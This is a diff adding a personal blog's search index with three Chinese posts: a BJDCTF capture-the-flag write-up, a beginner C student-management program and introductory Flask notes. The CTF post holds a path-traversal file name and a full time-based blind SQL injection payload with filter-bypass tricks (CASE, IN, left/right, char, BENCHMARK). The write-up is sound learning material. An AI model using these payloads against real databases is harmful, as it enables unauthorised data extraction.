@@ -1,0 +1,1689 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>BJDCTF 3rd-小知识点</title>
+    <url>/2020/05/24/BJDCTF-3rd-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
+    <content><![CDATA[<p>今天也是被题目暴打的一回呢（，只出来两道题，有大量的时间浪费在了多人运动的注入上…</p>
+<h1 id="小红花"><a href="#小红花" class="headerlink" title="小红花"></a>小红花</h1><p>很简单，因为shell_exec不会输出返回值（准确来说会返回一个字符串，但不会直接打印在浏览器上）。所以直接尝试反弹shell。这里用php反弹shell成功。<br>后来听说有防火墙ban了一些端口，运气好直接找到了没ban的（（（</p>
+<h1 id="gob"><a href="#gob" class="headerlink" title="gob"></a>gob</h1><p>在上传完文件后会设置一个phpsessid，再访问show.php会出现刚才上传的图片(data://base64的形式)。base64_decode(phpsessid)后发现里面含有上传文件的路径。故尝试上传一个<code>../../../../flag</code>(有多少个../我忘了)的文件。实现目录穿梭，得到flag。<br>PS：我最开始是以为要去解析那个phpsessid，尝试对其进行修改…结果完全不知道后面的hash值是怎么来的，最后发现做麻烦了</p>
+<h1 id="多人运动"><a href="#多人运动" class="headerlink" title="多人运动"></a>多人运动</h1><p>做了很长时间也没有做出来…看到那个hint以为是表名有东西…<br>首先是如何进行注入,可以看到服务器读取的数据会根据by参数进行排序，猜测是order by注入，首先排除联合注入<br>以下是我的payload：</p>
+<pre><code>http://x.x.x.x:xxxxx/?by=desc,(SELECT (CASE WHEN (select left((select group_concat(database_name) from mysql.innodb_table_stats),11)in(concat(char(109),char(121),char(115),char(113),char(108),char(44),char(115),char(121),char(115)))) THEN BENCHMARK(999999999,md5(1)) ELSE 1 END))
+
+详解：
+$payload = desc,(SELECT (CASE WHEN $a THEN $b ELSE 1 END))
+题目过滤了if，故使用case进行绕过
+
+$a = (select ($a_1)in($a_2))
+因为题目过滤了 =&lt;&gt;like 所以使用in来替代
+
+$a_1 = left($a_1_1,11)
+题目过滤了大多数字符串切割函数，可以使用left和right来绕过
+PS:看出题人同时使用left和right来达到提取单个字符的作用，这一点我没想到...如:right(left(xxx,3),2)
+
+$a_1_1 = (select group_concat(database_name) from mysql.innodb_table_stats)
+这里因为过滤了or和sys，没法提取表名，故尝试用mysql.innodb_table_stats来绕过，但这形成了一个大坑
+
+$a_2 = concat(char(109),char(121),char(115),char(113),char(108),char(44),char(115),char(121),char(115))
+这里因为单使用left提取出来的是字符串不是单个字符，而char函数没有ban，故使用上面的方式组合字符串
+PS：除了char以外还有unhex; conv;函数可以用，不过char更简单一些
+
+$b = BENCHMARK(999999999,md5(1))
+题目过滤了sleep，使用BENCHMARK多次执行一个操作</code></pre><p>然而这道题最终没能解出来的原因是使用了mysql.innodb_table_stats这个坑<br>诚然，innodb在默认情况下是关闭的，但不代表它不作用。<br>在其关闭的情况下使用mysql.innodb_table_stats查询，不会为空，而是能查出来mysql默认的两个库mysql和sys，其它库不能查到，表名同理。<br>而我以为…如果关闭了innodb，整个innodb_table_stats是空，没有数据的（<br>最终导致我这道题没有做出来…</p>
+<h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>因为花费了大量的时间在多人运动这道题上，其它的题没有看，待复现环境出来再说吧…<br>PS：我菜炸了（</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>C语言实现学生信息管理系统</title>
+    <url>/2020/03/17/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于疫情原因，最近只能呆在家里上网课，但实在不想听这个旅游管理的专业课（一直他喵的洗脑不要我们转专业DX）和英语（PS. 数学还是要听一听的），所以搞出来了这个东西……</p>
+<p>连带摸鱼耗费了4天的时间，共760行左右的代码，实现了链表节点的增删查改功能。由于还没有系统学习过C语言，所以许多东西都是自己摸索加查资料得来的。可能十分臃肿，欢迎批评斧正。<br>PS. 在大神们看来这可能不算什么，但我还是十分兴奋的(=v=)。</p>
+<h1 id="代码详情"><a href="#代码详情" class="headerlink" title="代码详情"></a>代码详情</h1><h2 id="main-c"><a href="#main-c" class="headerlink" title="main.c"></a>main.c</h2><pre><code>#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+#include&lt;string.h&gt;
+
+#include&quot;head.h&quot;
+
+newStudent *studentNext;
+
+int main(void)
+{
+    int modeCode;
+    initStudentList();
+    loadData(1);
+    while(1)
+    {
+        welcome();
+        printf(&quot;\nPlease select mode:&quot;);
+        scanf(&quot;%1d%*c&quot;, &amp;modeCode);
+        switch(modeCode)
+        {
+        case 1:
+            system(&quot;cls&quot;);
+            addStudent();
+            break;
+        case 2:
+            system(&quot;cls&quot;);
+            selStudentMain();
+            break;
+        case 3:
+            system(&quot;cls&quot;);
+            delStudentMain();
+            break;
+        case 4:
+            system(&quot;cls&quot;);
+            changeStudentMain();
+            break;
+        case 5:
+            system(&quot;cls&quot;);
+            loadData(0);
+            break;
+        case 6:
+            system(&quot;cls&quot;);
+            updateData();
+            break;
+        case 0:
+            free(studentNext);
+            exit(0);
+        }
+    }
+}</code></pre><h2 id="head-h"><a href="#head-h" class="headerlink" title="head.h"></a>head.h</h2><pre><code>//当前加载学生数量
+int studentNumber = 0;
+
+//学生结构体
+typedef struct students
+{
+    char id[11];
+    char name[40];
+    char sex[7];
+    char age[4];
+    struct students *next;
+}newStudent;
+
+//全局链表
+extern newStudent *studentNext;
+
+//欢迎词
+void welcome();
+
+//链表初始化
+void initStudentList();
+
+//更新学生数据
+int updateData();
+
+//加载学生数据
+int loadData(int autoCode);
+
+//添加学生
+int addStudent();
+
+//删除学生主菜单
+int delStudentMain();
+//通过学号删除学生
+int delStudentById(char *id, int autoCode);
+//通过姓名删除学生
+int delStudentByName(char *name, int autoCode);
+//删除当前所有数据
+int delAllStudent();
+
+//搜索学生主菜单
+int selStudentMain();
+//通过学号搜索学生
+newStudent *selStudentById(char *id);
+//通过姓名搜索学生
+newStudent *selStudentByName(char *name);
+
+//展示所有学生
+int showStudent();
+
+//更改学生数据主菜单
+int changeStudentMain();
+//更改学生数据
+int changeStudent(newStudent *studentTmp);
+
+//欢迎词
+void welcome()
+{
+    system(&quot;cls&quot;);
+    printf(&quot;========================================\n&quot;);
+    printf(&quot;=   _____    _____   __  __    _____   =\n&quot;);
+    printf(&quot;=  / ____|  / ____| |  \\/  |  / ____|  =\n&quot;);
+    printf(&quot;= | |      | (___   | \\  / | | (___    =\n&quot;);
+    printf(&quot;= | |       \\___ \\  | |\\/| |  \\___ \\   =\n&quot;);
+    printf(&quot;= | |____   ____) | | |  | |  ____) |  =\n&quot;);
+    printf(&quot;=  \\_____| |_____/  |_|  |_| |_____/   =\n&quot;);
+    printf(&quot;========================================\n&quot;);
+    printf(&quot;=====CUIT Student Management System=====\n&quot;);
+    printf(&quot;========================================\n&quot;);
+    printf(&quot;============Student Number:%d============\n&quot;, studentNumber);
+    printf(&quot;========================================\n&quot;);
+    printf(&quot;=============1.Add Student==============\n&quot;);
+    printf(&quot;=============2.Sel Student==============\n&quot;);
+    printf(&quot;=============3.Del Student==============\n&quot;);
+    printf(&quot;=============4.Cha Student==============\n&quot;);
+    printf(&quot;=============5.load   Data==============\n&quot;);
+    printf(&quot;=============6.update Data==============\n&quot;);
+    printf(&quot;=============0.Exit System==============\n&quot;);
+    printf(&quot;========================================\n&quot;);
+}
+
+//链表初始化
+void initStudentList()
+{
+    studentNext = (newStudent*)malloc(sizeof(newStudent));
+    studentNext-&gt;next = NULL;
+}
+
+//更新学生数据
+int updateData()
+{
+    FILE *fp = NULL;
+    newStudent *studentTmp = NULL;
+
+    if(studentNext-&gt;next != NULL)
+    {
+        if(remove(&quot;studentInfo.txt&quot;) == 0)
+        {
+            fp = fopen(&quot;studentInfo.txt&quot;, &quot;w&quot;);
+
+            studentTmp = studentNext-&gt;next;
+            if(fp != NULL)
+            {
+                while(studentTmp != NULL)
+                {
+                    fprintf(fp, &quot;|%s|%s|%s|%s|\n&quot;, studentTmp-&gt;id, studentTmp-&gt;name, studentTmp-&gt;sex, studentTmp-&gt;age);
+                    studentTmp = studentTmp-&gt;next;
+                }
+                fclose(fp);
+                printf(&quot;Updata completed\n&quot;);
+                delAllStudent();
+                loadData(1);
+            }
+            else
+                printf(&quot;File open fail\n&quot;);
+        }
+        else
+            printf(&quot;File delete fail\n&quot;);
+    }
+    else
+    {
+        fp = fopen(&quot;studentInfo.txt&quot;, &quot;w&quot;);
+        if(fgetc(fp) != EOF)
+        {
+            fclose(fp);
+            remove(&quot;studentInfo.txt&quot;);
+            fp = fopen(&quot;studentInfo.txt&quot;, &quot;w&quot;);
+            fclose(fp);
+        }
+        else
+            printf(&quot;The current data is empty!\n&quot;);
+    }
+    system(&quot;pause&quot;);
+    return 1;
+
+}
+
+//加载学生数据
+int loadData(int autoCode)
+{
+    FILE *fp = NULL;
+    char data[64] = {0};
+    char *str = NULL;
+    int i = 0;
+    int number = 0;
+    int judgeCode = 0;
+    newStudent *studentTmp = NULL;
+
+    fp = fopen(&quot;studentInfo.txt&quot;, &quot;r+b&quot;);
+
+    printf(&quot;Start load Data...\n&quot;);
+
+    while(fscanf(fp, &quot;%[^\n]%*c&quot;, data) != EOF)
+    {
+        studentTmp = (newStudent*)malloc(sizeof(newStudent));
+        str = strtok(data, &quot;|&quot;);
+        for(i = 0; i &lt; 4; i++)
+        {
+            if(str != NULL &amp;&amp; str != EOF &amp;&amp; str != &apos;\0&apos;)
+            {
+                switch(i)
+                {
+                case 0:
+                    if(selStudentById(str) == NULL)
+                    {
+                        strcpy(studentTmp-&gt;id, str);
+                        break;
+                    }
+                    else
+                    {
+                        judgeCode = 1;
+                        break;
+                    }
+                case 1:
+                    strcpy(studentTmp-&gt;name, str);
+                    break;
+                case 2:
+                    strcpy(studentTmp-&gt;sex, str);
+                    break;
+                case 3:
+                    strcpy(studentTmp-&gt;age, str);
+                    break;
+                }
+                if(judgeCode)
+                    break;
+                str = strtok(NULL, &quot;|&quot;);
+            }
+        }
+        if(!judgeCode)
+        {
+            studentTmp-&gt;next = studentNext-&gt;next;
+            studentNext-&gt;next = studentTmp;
+            studentNumber++;
+            number++;
+        }
+    }
+    printf(&quot;All done, loaded %d student...\n&quot;, number);
+    fclose(fp);
+    if(!autoCode)
+        system(&quot;pause&quot;);
+    return 1;
+}
+
+//添加学生
+int addStudent()
+{
+    int sexCode = 0;        //性别状态码
+    int judgeCode = 0;
+    FILE *fp = NULL;        //文件变量
+    char continueCode = 1;   //判断是否继续添加
+    newStudent *studentSel = NULL;
+
+    while(1)
+    {
+        fp = fopen(&quot;studentInfo.txt&quot;, &quot;a&quot;);
+        //分配新内存
+        newStudent *studentTmp = (newStudent*)malloc(sizeof(newStudent));
+
+        printf(&quot;Please enter the id of the new student:&quot;);
+        scanf(&quot;%10[^\n]%*c&quot;, &amp;studentTmp-&gt;id);
+
+        if(studentNext-&gt;next != NULL)
+        {
+            studentSel = selStudentById(studentTmp-&gt;id);
+
+            if(studentSel != NULL)
+            {
+                printf(&quot;The same ID has been entered!\n&quot;);
+                printf(&quot;Students found:%-11s%-20s%-7s%-4s\n&quot;, studentSel-&gt;id, studentSel-&gt;name, studentSel-&gt;sex, studentSel-&gt;age);
+                printf(&quot;Would you like to update this student&apos;s information?[Yes(1)/No(0)]:&quot;);
+                scanf(&quot;%1d%*c&quot;, &amp;judgeCode);
+                if(judgeCode == 1)
+                    delStudentById(studentTmp-&gt;id, 1);
+                else
+                    return -1;
+            }
+        }
+
+        printf(&quot;Please enter the name of the new student:&quot;);
+        scanf(&quot;%39[^\n]&quot;, &amp;studentTmp-&gt;name);
+
+        while(1)
+        {
+            printf(&quot;Please choose the sex of the new student[Male(1)/Female(0)]:&quot;);
+            scanf(&quot;%1d%*c&quot;, &amp;sexCode);
+            if(sexCode == 1)
+            {
+                strcpy(studentTmp-&gt;sex ,&quot;Male&quot;);
+                break;
+            }
+            else if(sexCode == 0)
+            {
+                strcpy(studentTmp-&gt;sex, &quot;Female&quot;);
+                break;
+            }
+            else
+                printf(&quot;Choose Error\n&quot;);
+        }
+
+        printf(&quot;Please enter the age of the new student:&quot;);
+        scanf(&quot;%3[^\n]%*c&quot;, &amp;studentTmp-&gt;age);
+
+        if(fp != NULL)
+        {
+            fprintf(fp, &quot;|%s|%s|%s|%s|\n&quot;, studentTmp-&gt;id, studentTmp-&gt;name, studentTmp-&gt;sex, studentTmp-&gt;age);
+            fclose(fp);
+        }else
+        {
+            printf(&quot;File open fail!\n&quot;);
+        }
+
+        studentTmp-&gt;next = studentNext-&gt;next;
+        studentNext-&gt;next = studentTmp;
+
+        studentNumber++;
+
+        while(continueCode)
+        {
+            printf(&quot;Do you want to continue adding students?[Yes(1)/No(0)]:&quot;);
+            scanf(&quot;%1d%*c&quot;, &amp;continueCode);
+            if(continueCode)
+                system(&quot;cls&quot;);
+                break;
+        }
+
+        if(!continueCode)
+            break;
+    }
+    return 1;
+}
+
+//删除学生主菜单
+int delStudentMain()
+{
+    int modeCode = 0;
+    int judgeCode = 0;
+    char id[11] = {0};
+    char name[40] = {0};
+
+    if(studentNext-&gt;next != NULL)
+    {
+        printf(&quot;What keywords do you want to delete data from?\n&quot;);
+        printf(&quot;&gt;Cancel(Other)\n&quot;);
+        printf(&quot;&gt;Student&apos;s id(1)\n&quot;);
+        printf(&quot;&gt;Student&apos;s name(2)\n&quot;);
+        printf(&quot;&gt;Delete all student(3)\n&quot;);
+        printf(&quot;I choose to delete data by:&quot;);
+        scanf(&quot;%1d%*c&quot;, &amp;modeCode);
+
+        switch(modeCode)
+        {
+        case 1:
+            system(&quot;cls&quot;);
+            printf(&quot;Please enter the ID of the student you want to delete:&quot;);
+            scanf(&quot;%10s%*c&quot;, &amp;id);
+            delStudentById(id, 0);
+            modeCode = 1;
+            break;
+        case 2:
+            system(&quot;cls&quot;);
+            printf(&quot;Please enter the name of the student you want to delete:&quot;);
+            scanf(&quot;%[^\n]%*c&quot;, &amp;name);
+            delStudentByName(name, 0);
+            modeCode = 1;
+            break;
+        case 3:
+            system(&quot;cls&quot;);
+            printf(&quot;Are you sure you want to delete all student data?[Yes(1)/No(0)]:&quot;);
+            scanf(&quot;%1d%*c&quot;, &amp;judgeCode);
+            if(judgeCode)
+                delAllStudent();
+            modeCode = 1;
+            break;
+        default:
+            modeCode = 0;
+            break;
+        }
+    }
+    else
+    {
+        printf(&quot;The current data is empty!\n&quot;);
+        system(&quot;pause&quot;);
+    }
+    return(modeCode);
+}
+
+//通过学号删除学生
+int delStudentById(char *id, int autoCode)
+{
+    int judgeCode = 1;
+    newStudent *studentDel = NULL;
+    newStudent *studentTmp = NULL;
+
+    studentTmp = studentNext;
+    studentDel = studentNext-&gt;next;
+    if(studentNext-&gt;next != NULL)
+    {
+        while(judgeCode)
+        {
+            judgeCode = strncmp(studentDel-&gt;id, id, 10);
+            if(!judgeCode)
+            {
+                printf(&quot;Removed student:%-11s%-20s%-7s%-4s\n&quot;, studentDel-&gt;id, studentDel-&gt;name, studentDel-&gt;sex, studentDel-&gt;age);
+                studentTmp-&gt;next = studentDel-&gt;next;
+                studentNumber--;
+                printf(&quot;successfully deleted\n&quot;);
+                break;
+            }
+            if(studentDel-&gt;next == NULL)
+            {
+                printf(&quot;No corresponding ID found!\n&quot;);
+                break;
+            }
+            studentTmp = studentDel;
+            studentDel = studentDel-&gt;next;
+        }
+        free(studentDel);
+    }
+    else
+    {
+        printf(&quot;The current data is empty!\n&quot;);
+    }
+    if(!autoCode)
+        system(&quot;pause&quot;);
+    return 1;
+}
+
+//通过姓名删除学生
+int delStudentByName(char *name, int autoCode)
+{
+    int judgeCode = 1;
+    newStudent *studentDel = NULL;
+    newStudent *studentTmp = NULL;
+
+    studentTmp = studentNext;
+    studentDel = studentNext-&gt;next;
+    if(studentNext-&gt;next != NULL)
+    {
+        while(judgeCode)
+        {
+            judgeCode = strcmp(studentDel-&gt;name, name);
+            if(!judgeCode)
+            {
+                printf(&quot;Removed student:%-11s%-20s%-7s%-4s\n&quot;, studentDel-&gt;id, studentDel-&gt;name, studentDel-&gt;sex, studentDel-&gt;age);
+                studentTmp-&gt;next = studentDel-&gt;next;
+                studentNumber--;
+                printf(&quot;successfully deleted\n&quot;);
+                break;
+            }
+            if(studentDel-&gt;next == NULL)
+            {
+                printf(&quot;No corresponding name found!\n&quot;);
+                break;
+            }
+            studentTmp = studentDel;
+            studentDel = studentDel-&gt;next;
+        }
+        free(studentDel);
+    }
+    else
+    {
+        printf(&quot;The current data is empty!\n&quot;);
+    }
+    if(!autoCode)
+        system(&quot;pause&quot;);
+    return 1;
+}
+
+//删除当前所有数据
+int delAllStudent()
+{
+    free(studentNext);
+    initStudentList();
+    studentNumber = 0;
+    return 1;
+}
+
+//搜索学生主菜单
+int selStudentMain()
+{
+    int modeCode = 0;
+    char id[11] = {0};
+    char name[40] = {0};
+    newStudent *studentTmp = NULL;
+
+    if(studentNext-&gt;next != NULL)
+    {
+        printf(&quot;What keywords do you want to select data from?\n&quot;);
+        printf(&quot;&gt;Cancel(Other)\n&quot;);
+        printf(&quot;&gt;Student&apos;s ID(1)\n&quot;);
+        printf(&quot;&gt;Student&apos;s name(2)\n&quot;);
+        printf(&quot;&gt;Show all student(3)\n&quot;);
+        printf(&quot;I choose to select data by:&quot;);
+        scanf(&quot;%1d%*c&quot;, &amp;modeCode);
+
+        switch(modeCode)
+        {
+        case 1:
+            system(&quot;cls&quot;);
+            printf(&quot;Please enter the ID of the student you want to select:&quot;);
+            scanf(&quot;%10[^\n]%*c&quot;, &amp;id);
+            studentTmp = selStudentById(id);
+            if(studentTmp != NULL)
+                printf(&quot;Students found:%-11s%-20s%-7s%-4s\n&quot;, studentTmp-&gt;id, studentTmp-&gt;name, studentTmp-&gt;sex, studentTmp-&gt;age);
+            else
+                printf(&quot;No corresponding ID found!\n&quot;);
+            system(&quot;pause&quot;);
+            modeCode = 1;
+            break;
+        case 2:
+            system(&quot;cls&quot;);
+            printf(&quot;Please enter the name of the student you want to select:&quot;);
+            scanf(&quot;%[^\n]%*c&quot;, &amp;name);
+            studentTmp = selStudentByName(name);
+            if(studentTmp != NULL)
+                printf(&quot;Students found:%-11s%-20s%-7s%-4s\n&quot;, studentTmp-&gt;id, studentTmp-&gt;name, studentTmp-&gt;sex, studentTmp-&gt;age);
+            else
+                printf(&quot;No corresponding ID found!\n&quot;);
+            system(&quot;pause&quot;);
+            modeCode = 1;
+            break;
+        case 3:
+            showStudent();
+            break;
+        default:
+            modeCode = 0;
+            break;
+        }
+    }
+    else
+    {
+        printf(&quot;The current data is empty!\n&quot;);
+        system(&quot;pause&quot;);
+    }
+    return(modeCode);
+}
+
+//通过学号搜索学生
+newStudent *selStudentById(char *id)
+{
+    int judgeCode = 1;
+    newStudent *studentTmp = NULL;
+
+    if(studentNext-&gt;next != NULL)
+    {
+        studentTmp = studentNext-&gt;next;
+        while(judgeCode)
+        {
+            judgeCode = strncmp(studentTmp-&gt;id, id, 10);
+            if(judgeCode)
+                studentTmp = studentTmp-&gt;next;
+            if(studentTmp == NULL)
+                judgeCode = 0;
+        }
+    }
+    else
+    {
+        printf(&quot;The current data is empty!\n&quot;);
+    }
+    return studentTmp;
+}
+
+//通过姓名搜索学生
+newStudent *selStudentByName(char *name)
+{
+    int judgeCode = 1;
+    newStudent *studentTmp = NULL;
+
+    if(studentNext-&gt;next != NULL)
+    {
+        studentTmp = studentNext-&gt;next;
+        while(judgeCode)
+        {
+            judgeCode = strcmp(studentTmp-&gt;name, name);
+            if(judgeCode)
+                studentTmp = studentTmp-&gt;next;
+            if(studentTmp == NULL)
+                judgeCode = 0;
+        }
+    }
+    else
+    {
+        printf(&quot;The current data is empty!\n&quot;);
+    }
+    return studentTmp;
+}
+
+//展示所有学生
+int showStudent()
+{
+    newStudent *studentNow;
+
+    if(studentNext-&gt;next != NULL)
+    {
+        studentNow = studentNext-&gt;next;
+        while(studentNow != NULL)
+        {
+            printf(&quot;%-11s%-20s%-7s%-4s\n&quot;, studentNow-&gt;id, studentNow-&gt;name, studentNow-&gt;sex, studentNow-&gt;age);
+            studentNow = studentNow-&gt;next;
+        }
+        printf(&quot;All done...\n&quot;);
+    }
+    else
+    {
+        printf(&quot;The current data is empty!\n&quot;);
+    }
+    system(&quot;pause&quot;);
+    return 1;
+}
+
+//更改学生数据主菜单
+int changeStudentMain()
+{
+    int modeCode = 0;
+    char id[11] = {0};
+    char name[40] = {0};
+    newStudent *studentTmp = NULL;
+
+    if(studentNext-&gt;next != NULL)
+    {
+        printf(&quot;What keywords do you want to select data from?\n&quot;);
+        printf(&quot;&gt;Cancel(Other)\n&quot;);
+        printf(&quot;&gt;Student&apos;s ID(1)\n&quot;);
+        printf(&quot;&gt;Student&apos;s name(2)\n&quot;);
+        printf(&quot;I choose to select data by:&quot;);
+        scanf(&quot;%1d%*c&quot;, &amp;modeCode);
+
+        switch(modeCode)
+        {
+        case 1:
+            system(&quot;cls&quot;);
+            printf(&quot;Please enter the ID of the student you want to select:&quot;);
+            scanf(&quot;%10[^\n]%*c&quot;, &amp;id);
+            studentTmp = selStudentById(id);
+            if(studentTmp != NULL)
+            {
+                printf(&quot;Students found:%-11s%-20s%-7s%-4s\n&quot;, studentTmp-&gt;id, studentTmp-&gt;name, studentTmp-&gt;sex, studentTmp-&gt;age);
+                changeStudent(studentTmp);
+            }
+            else
+                printf(&quot;No corresponding ID found!\n&quot;);
+            system(&quot;pause&quot;);
+            modeCode = 1;
+            break;
+        case 2:
+            system(&quot;cls&quot;);
+            printf(&quot;Please enter the name of the student you want to select:&quot;);
+            scanf(&quot;%[^\n]%*c&quot;, &amp;name);
+            studentTmp = selStudentByName(name);
+            if(studentTmp != NULL)
+            {
+                printf(&quot;Students found:%-11s%-20s%-7s%-4s\n&quot;, studentTmp-&gt;id, studentTmp-&gt;name, studentTmp-&gt;sex, studentTmp-&gt;age);
+                changeStudent(studentTmp);
+            }
+            else
+                printf(&quot;No corresponding ID found!\n&quot;);
+            system(&quot;pause&quot;);
+            modeCode = 1;
+            break;
+        default:
+            modeCode = 0;
+            break;
+        }
+    }
+    else
+    {
+        printf(&quot;The current data is empty!\n&quot;);
+        system(&quot;pause&quot;);
+    }
+
+    return 1;
+}
+
+//更改学生数据
+int changeStudent(newStudent *studentTmp)
+{
+    int sexCode = 0;
+
+    if(studentNext-&gt;next != NULL)
+    {
+        printf(&quot;Please enter the id of the new student:&quot;);
+        scanf(&quot;%10[^\n]%*c&quot;, &amp;studentTmp-&gt;id);
+
+        printf(&quot;Please enter the name of the new student:&quot;);
+        scanf(&quot;%39[^\n]%*c&quot;, &amp;studentTmp-&gt;name);
+
+        while(1)
+        {
+            printf(&quot;Please choose the sex of the new student[Male(1)/Female(0)]:&quot;);
+            scanf(&quot;%1d%*c&quot;, &amp;sexCode);
+            if(sexCode == 1)
+            {
+                strcpy(studentTmp-&gt;sex ,&quot;Male&quot;);
+                break;
+            }
+            else if(sexCode == 0)
+            {
+                strcpy(studentTmp-&gt;sex, &quot;Female&quot;);
+                break;
+            }
+            else
+                printf(&quot;Choose Error\n&quot;);
+        }
+
+        printf(&quot;Please enter the age of the new student:&quot;);
+        scanf(&quot;%3[^\n]%*c&quot;, &amp;studentTmp-&gt;age);
+    }
+    else
+    {
+        printf(&quot;The current data is empty!\n&quot;);
+        system(&quot;pause&quot;);
+    }
+    return 1;
+}</code></pre><h1 id="一些我想要说的点"><a href="#一些我想要说的点" class="headerlink" title="一些我想要说的点"></a>一些我想要说的点</h1><h2 id="scanf读取空格以及缓冲区对scanf的影响"><a href="#scanf读取空格以及缓冲区对scanf的影响" class="headerlink" title="scanf读取空格以及缓冲区对scanf的影响"></a>scanf读取空格以及缓冲区对scanf的影响</h2><p>最开始的时候，我希望通过：</p>
+<pre><code>char str_1[11] = {0};
+char str_2[11] = {0};
+
+scanf(&quot;%10s&quot;, &amp;str_1);
+scanf(&quot;%10s&quot;, &amp;str_2);</code></pre><p>的方式来获取字符串，但我发现上例是无法读取空格的。而且，第二个scanf函数被跳过了。</p>
+<p>关于第一个问题，稍微了解一点CTF知识的都知道，这里肯定不能使用<code>gets()</code>函数，因为他不安全。不过，我们可以使用<code>gets_s()</code>函数替换他。不过因为我喜欢搞事XD，所以我倔强地想要用<code>scanf()</code>函数（雾）；还有一方面，虽然我没有上过C语言课，但我觉得像<code>gets_s()</code>、<code>scanf_s()</code>这种函数应该不会讲的吧（，所以我打算用初学者的常用函数来实现。</p>
+<p>而第二个问题我则完全没有头绪…</p>
+<p>后来在一位师傅和搜集来的资料的帮助下。谜题，解开了。<br>师傅给我了一个这样的写法：</p>
+<pre><code>char str_1[11] = {0};
+char str_2[11] = {0};
+
+//这个是师傅给的写法
+//scanf(&quot;%[^\n]%*c&quot;, &amp;str_1);
+//scanf(&quot;%[^\n]%*c&quot;, &amp;str_2);
+
+//我改进了一下（
+scanf(&quot;%10[^\n]%*c&quot;, &amp;str_1);
+scanf(&quot;%10[^\n]%*c&quot;, &amp;str_2);</code></pre><p>详细资料：<a href="https://blog.csdn.net/q_l_s/article/details/22572777" target="_blank" rel="noopener">https://blog.csdn.net/q_l_s/article/details/22572777</a></p>
+<p>首先，第一个问题。采取<code>%10[^\n]%*c</code>的写法需要分开来讲：</p>
+<pre><code>{%10[^\n]}
+    {10}:读入10个字符
+    {[^\n}:读入回车符前(不含回车符)的所有字符
+{%*c}:忽略后面的字符</code></pre><p>可以查看上面的详细资料，资料就不展开了</p>
+<p>第二个问题的资料：<a href="https://blog.csdn.net/hhhhhyyyyy8/article/details/80917713" target="_blank" rel="noopener">https://blog.csdn.net/hhhhhyyyyy8/article/details/80917713</a><br>简单来说，就是前一个scanf把这次读取的回车符留在了缓冲区里，第二个scanf来读取缓冲区时便会读入这个回车导致第二个scanf被跳过。</p>
+<h2 id="整体架构-结构"><a href="#整体架构-结构" class="headerlink" title="整体架构(结构?)"></a>整体架构(结构?)</h2><p>由于我没有学过软件工程之类的课程，所以这里的用词可能不太准确。</p>
+<pre><code>|-主函数
+|----|-次函数-|-功能函数
+     |        |-功能函数
+     |          |...
+     |
+     |-次函数-|...
+    ...</code></pre><p>上面的结构打的有点混乱，简单来说就是每个功能有自己独立的主函数，由这个函数来调用功能函数。比如查询学生数据，有一个进行数据输入的主函数，然后将收集的信息加载到功能函数中。</p>
+<p>这次整体代码的架构很失败（PS. 最开始压根没有思考到架构这一码事，在慢慢码的过程中才发现架构很重要），有许多代码其实可以用函数封装重复使用。在早期还在一些功能上的函数里面加入了数据输入……下次需要注意。</p>
+<h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><p>emmmm总之就先这么多吧……以后来温故知新<br>PS. 估计以后不想看见这坨屎山（确信</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>FLASK学习笔记-WIP</title>
+    <url>/2020/02/24/FLASK%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-WIP/</url>
+    <content><![CDATA[<h1 id="flask学习笔记"><a href="#flask学习笔记" class="headerlink" title="flask学习笔记"></a>flask学习笔记</h1><p>这里是我的flask学习笔记，绝赞更新中！欢迎批评斧正。</p>
+<p>[TOC]</p>
+<h2 id="基本代码"><a href="#基本代码" class="headerlink" title="基本代码"></a>基本代码</h2><pre><code>from flask import Flask
+
+app = Flask(__name__)
+
+@app.route(&quot;/&quot;)
+def hello():
+    return &quot;Fuck this world!!!&quot;
+
+@app.route(&quot;/test/av&lt;int:video_id&gt;&quot;)
+def test(video_id):
+    return &apos;welcome %s&apos; % video_id
+
+if __name__ == &apos;__main__&apos;:
+    app.run(host=&apos;localhost&apos;)</code></pre><ol>
+<li><code>from flask import Flask</code>在这里我们为其导入了flask模块中的Flask类</li>
+<li><code>app = Flask(__name__)</code>新建了一个flask对象，其中<code>__name__</code>参数用来确认我们的模板和文件的地址。</li>
+<li>使用<code>route</code>函数和装饰器来确定激活函数的地址，这个被称为路由</li>
+</ol>
+<h2 id="启动flask"><a href="#启动flask" class="headerlink" title="启动flask"></a>启动flask</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><pre><code>set FLASK_APP=main.py
+# 确定启动起始点
+
+set FLASK_VNE=development
+# 设定为调试模式，代码一旦有改动自动重启服务器
+# 在实际中不要开启
+
+flask run --port 8848
+# 启动flask
+# --host 设置地址
+# --port 设置端口</code></pre><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>与windows类似</p>
+<pre><code>$ export FLASK_APP=main.py
+...</code></pre><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p><code>@app.route()</code>便是一个路由，在括号内填入地址，如上例一样，即可完成函数与路由的绑定。</p>
+<h3 id="路由中的参数"><a href="#路由中的参数" class="headerlink" title="路由中的参数"></a>路由中的参数</h3><pre><code>@app.route(&quot;/test/av&lt;int:video_id&gt;&quot;)
+def test(video_id):
+    if(video_id == 114514):
+        welcomeS = &apos;いいよ！こいよ！&apos;
+    else:
+        welcomeS = &quot;There is the&quot;
+    return welcomeS + &apos; &apos; + str(video_id)</code></pre><p>在上例中，我们在路由中规定了<code>&lt;int:video_id&gt;</code>来定义正整数类型参数<code>video_id</code>。再将其填入链接的函数内即可应用该参数。<br>以下列出了可填入的参数<br>string：接受一切不包括斜杠的字符<br>int：接受正整数<br>float：接受正浮点数<br>path：接受一切字符<br>uuid：接受uuid字符串</p>
